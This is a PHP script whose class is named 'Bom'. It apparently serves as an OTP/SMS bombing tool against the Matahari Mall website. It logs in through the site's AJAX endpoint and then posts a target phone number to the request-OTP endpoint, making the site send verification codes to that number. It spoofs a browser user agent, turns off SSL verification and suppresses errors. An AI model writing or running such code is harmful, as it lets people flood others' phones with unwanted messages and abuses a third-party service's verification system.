<?php
error_reporting(0);

Class Bom {

    public $no;
    public $email;
    public $pass;

	public function sendC($url, $page, $params) {

        $ch = curl_init(); 
        curl_setopt ($ch, CURLOPT_URL, $url.$page); 
        curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 

        if(!empty($params)) {
        curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt ($ch, CURLOPT_POST, 1); 
        }

        curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
        curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
        curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);

        $headers  = array();
        $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
        $headers[] = 'X-Requested-With: XMLHttpRequest';

        curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);    
        //curl_setopt ($ch, CURLOPT_HEADER, 1);
        $result = curl_exec ($ch);
        curl_close($ch);
        return $result;

    }

    private function getStr($start, $end, $string) {
        if (!empty($string)) {
        $setring = explode($start,$string);
        $setring = explode($end,$setring[1]);
        return $setring[0];
        }
    }


    public function Login($email,$pass)
    {
    	$url = "https://www.mataharimall.com/user/ajax/login";
        $email = $this->email;
        $pass = $this->pass;
    	$data = "email={$email}&passwd={$pass}";
    	$send = $this->sendC($url, null, $data);
    	if (preg_match('/sukses/', $send)) {
                // print('Login success<br>');
            } else {
                // print("Login failed<br>");
            }
    }

    public function Verif()
    {
        $url = "https://www.mataharimall.com/user/ajax/requestotp";
        $no = $this->no;
        $data = "phone_number={$no}";
        $send = $this->sendC($url, null, $data);
        if (preg_match('/Kode OTP berhasil dikirim/', $send)) {
                print('send success');
            } else {
                print('send failed');
            }
    }

    
}



